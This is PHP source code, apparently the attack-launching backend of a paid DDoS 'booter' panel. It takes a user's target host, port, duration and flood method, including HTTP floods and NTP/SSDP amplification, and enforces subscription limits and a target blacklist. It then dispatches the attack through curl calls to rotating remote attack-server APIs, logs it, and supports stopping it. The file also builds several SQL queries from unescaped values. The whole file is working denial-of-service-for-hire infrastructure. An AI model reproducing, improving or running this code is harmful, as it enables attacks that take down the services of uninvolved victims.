<?php

	ob_start();
	require_once '../app/config.php';
	require_once '../app/init.php'; 

	$vip = '0';

	
	if (!empty($maintaince)) {
		die($maintaince);
	}

	if (!($user->LoggedIn()) || !($user->notBanned($odb)) || !(isset($_GET['type']))) {
		die();
	}

	if (!($user->hasMembership($odb)) && $testboots == 0) {
		die();
	}

	$type     = $_GET['type'];
	$l4 = true;
	$username = $_SESSION['username'];
	
	//Start attack function
	if ($type == 'startl7' || $type == 'renew'){
		
		if ($type == 'startl7') {

			//Get, set and validate!
			$host   = $_GET['host'];
			$time   = intval($_GET['time']);
			$method = $_GET['method'];
			$port = isset($_GET['port']) ? $_GET['port'] : '';

			$referer   = '';
			$cookie   = '';
			$emulation   = '';
			$postdata   = '';
			$mode   = '';
			$rmethod   = '';

			if (empty($host) || empty($time) || empty($method) || empty($port)) {
				die(error('Please verify all fields.'));
			}


			//Check if the method is legit
			if (!ctype_alnum(str_replace(' ', '', $method))) {
				die(error('Method is unavailable.'));
			}

			$SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$countMethod = $SQL -> fetchColumn(0);

			if ($countMethod == 0) {
				die(error('Method is unavailable.'));
			}

			//Check if the host is a valid url or IP
			$SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$type = $SQL -> fetchColumn(0);
			$l4 = $type !== 'layer7';
			if ($type == 'layer7') {
				

				$referer   = $_GET['referer'];
				$cookie   = $_GET['cookie'];
				$emulation   = $_GET['emulation'];
				$postdata   = $_GET['postdata'];
				$mode   = $_GET['mode'];
				$rmethod   = $_GET['rmethod'];

							
				//Verifying all fields
				if (empty($mode)) {
					die(error('Please verify all fields.'));
				}

				if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
                     die(error('Host is not a valid URL. Use with http:// or https://'));
				}
				

				$parameters = array(".gov", "https://blog.bathtubbashing.xyz", "dev.dststx.xyz", "forum_new.tendust.xyz", "dev.exitus.me", "dstat.one", "127.0.0.1", "dststx", "https://admin.kingblue.xyz", ";", "sberbank.ru", "tinkoff.ru", ".edu", "fsb", "mos.ru", "fsb.ru", "vk.com", "$", "{", "%", "<");

				foreach ($parameters as $parameter) {
					if (strpos($host, $parameter)) {
						die(error('目标已经加入黑名单中你无法攻击'));
					}
				}

			} elseif (!filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
                die(error("Host $host is not a valid IP address"));
            }

			//Check if host is blacklisted
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host' AND `type` = 'victim'");
			$SQL -> execute(array(':host' => $host));
			$countBlacklist = $SQL -> fetchColumn(0);

			if ($countBlacklist > 0) {
				die(error('Host is blacklisted.'));
			}

		} else {
			$l4 = true;
			$renew     = intval($_GET['id']);
			$SQLSelect = $odb->prepare("SELECT * FROM `logs` WHERE `id` = :renew");
			$SQLSelect -> execute(array(':renew' => $renew));
		
			while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
				$host   = $show['ip'];
				$port   = $show['port'];
				$time   = $show['time'];
				$vip   = $show['vip'];
				$method = $show['method'];
				$userr  = $show['user'];
			}

			if (!($userr == $username) && !$user->isAdmin($odb)) {
				die(error('This is not your attack.'));
			}
		}

		//Check concurrent attacks
		if ($user->hasMembership($odb)) {
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
			$SQL -> execute(array(':username' => $username));
			$countRunning = $SQL -> fetchColumn(0);
			if ($countRunning >= $stats->concurrents($odb, $username)) {
				die(error('You have too many boots running.'));
			}
		}

		//Check max boot time
		$SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
		$SQLGetTime->execute(array(':id' => $_SESSION['ID']));
		$maxTime = $SQLGetTime->fetchColumn(0);

		if (!$user->hasMembership($odb) && $testboots == 1) {
			$maxTime = 60;
		}

		if ($time > $maxTime){
			die(error('您设置的攻击时间已经超过你套餐的最大攻击时间'));
		}
		
		if ($_GET['method'] === "ssdp")
        if ($time > 60 || $time < 15) die(error('此模式最大的攻击时间为60秒'));
        
        if ($_GET['method'] === "ntp")
        if ($time > 60 || $time < 15) die(error('此模式最大的攻击时间为60秒'));
		
		if($time < 15){
			die(error('您的攻击时间必须超过15秒'));
		}

		//Check open slots
		if ($stats->runningBoots($odb) > $maxattacks && $maxattacks > 0) {
			die(error('没有空闲的服务器来执行您的任务'));
		}

		
		// check cooldown
		
		if ($cooldown == 1) {
			die(error('正在维护请稍后...'));
		}
		
		//Check if test boot has been launched
		if(!$user->hasMembership($odb)){
			$testattack = $odb->query("SELECT `testattack` FROM `users` WHERE `username` = '$username'")->fetchColumn(0);
			if ($testboots == 1 && $testattack > 0) {
				die(error('You have already launched your test attack.'));
			}
		}

        //Check rotation
        $i = 0;
		
		// Checks if the attack is VIP
		if ($vip == '1') { 
			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `vip` = '1' AND `methods` LIKE :method ORDER BY RAND()");
			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
		} else { 
			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `vip` = '0' AND `methods` LIKE :method ORDER BY RAND()");
			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
		  }

		  
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {

            if ($rotation == 1 && $i > 0) {
                break;
            }

            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);

            if ($count >= $show['slots']) {
                continue;
            }

            $i++;
			
			if (!$l4) {
            	$arrayFind = array('[host]', '[postdata]', '[time]', '[method]');
				$arrayReplace = array($host, $postdata, $time, $method);
			} else {
				$arrayFind = array('[host]', '[port]', '[time]', '[method]');
				$arrayReplace = array($host, $port, $time, $method);
			}
            
            $APILink = $show['api'];
			$handler[] = $show['name'];
			$username = $_SESSION['username'];
  
            $APILink = str_replace($arrayFind, $arrayReplace, $APILink);
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            $result = curl_exec($ch);
            curl_close($ch);

        }

        if ($i == 0) {
            die(error('非常抱歉，您无权使用VIP模式'));
        }

		//End of attacking servers script
		$handlers     = @implode(",", $handler);

		//Insert Logs
		$chart = date("d-m");
		$insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :time, :method, :postdata, :mode, :rmethod, :cookie, UNIX_TIMESTAMP(), :chart, '0', :handler, :referer)");
		$insertLogSQL -> execute(array(':user' => $username, ':ip' => $host, ':time' => $time, ':method' => $method, ':cookie' => $cookie, ':postdata' => $postdata, ':mode' => $mode, ':rmethod' => $rmethod, ':chart' => $chart, ':handler' => $handlers, ':referer' => $referer));

		//Insert test attack
		if (!$user->hasMembership($odb) && $testboots == 1) {
			$SQL = $odb->query("UPDATE `users` SET `testattack` = 1 WHERE `username` = '$username'");
		}
		

		
		// Gen Here
		
		
		$key = md5(microtime() . rand());
		$insertLogSQL = $odb->prepare("INSERT INTO `ping_sessions` VALUES(NULL, :ping_key, :user_id, :ping_ip, :ping_port)");
		$insertLogSQL -> execute(array(':ping_key' => $key, ':user_id' => $_SESSION['ID'], ':ping_ip' => $host, ':ping_port' => $port));
		
		echo success("攻击发送成功");

	}



	//Stop attack function

	if ($type == 'stop'){

		$stop = intval($_GET['id']);
		$SQLSelect = $odb -> query("SELECT * FROM `logs` WHERE `id` = '$stop'");

		while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
			$host = $show['ip'];
			$port = isset($show['port']) ? $show['port'] : '80';
			$time = $show['time'];
			$method = $show['method'];
			$handler = $show['handler'];
			$command = $odb->query("SELECT `command` FROM `methods` WHERE `name` = '$method'")->fetchColumn(0);
		}

		$handlers = explode(",", $handler);
	
		foreach ($handlers as $handler){
			
			$SQLSelectAPI = $odb -> query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");
	
			while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {

				$APILink = $show['api'];

			}
			
			$arrayFind = array('[host]', '[port]', '[time]', '[method]');
			$arrayReplace = array($host, $port, $time, $method);
		
			$APILink = str_replace($arrayFind, $arrayReplace, $APILink);
			$stopcommand  = "&method=STOP";
			$stopapi = $APILink . $stopcommand;
			
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $stopapi);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_TIMEOUT, 3);
			curl_exec($ch);
			curl_close($ch);
			
		}
		
		$SQL = $odb -> query("UPDATE `logs` SET `stopped` = 1 WHERE `id` = '$stop'");
		die(success('攻击以停止!'));
		
	}
	
	if ($type == 'stopall'){

		$stop = intval($_GET['id']);
		$SQLSelect = $odb -> prepare("SELECT * FROM `api` WHERE `ID` = '$stop'");
		while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
			
			$host = $show['ip'];
			$port = $show['port'];
			$time = $show['time'];
			$method = $show['method'];
			$handler = $show['handler'];
			$command = $odb->query("SELECT `command` FROM `methods` WHERE `name` = '$method'")->fetchColumn(0);
		}

		$handlers = explode(",", $handler);
	
		foreach ($handlers as $handler){
			
			$SQLSelectAPI = $odb -> query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");
	
			while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {

				$APILink = $show['api'];

			}
			
			$arrayFind = array('[host]', '[port]', '[time]', '[method]');
			$arrayReplace = array($host, $port, $time, $method);
		
			$APILink = str_replace($arrayFind, $arrayReplace, $APILink);
			$stopcommand  = "&method=stop";
			$stopapi = $APILink . $stopcommand;
			
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $stopapi);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_TIMEOUT, 3);
			curl_exec($ch);
			curl_close($ch);
			
		}
		
		$SQL = $odb -> prepare("UPDATE `logs` SET `time` = 0 WHERE `user` = '{$_SESSION['username']}' AND `id` = '$stop' AND `time` + `date` > UNIX_TIMESTAMP()");
		die(success('Attacks has been stopped!'));
		
	}

?>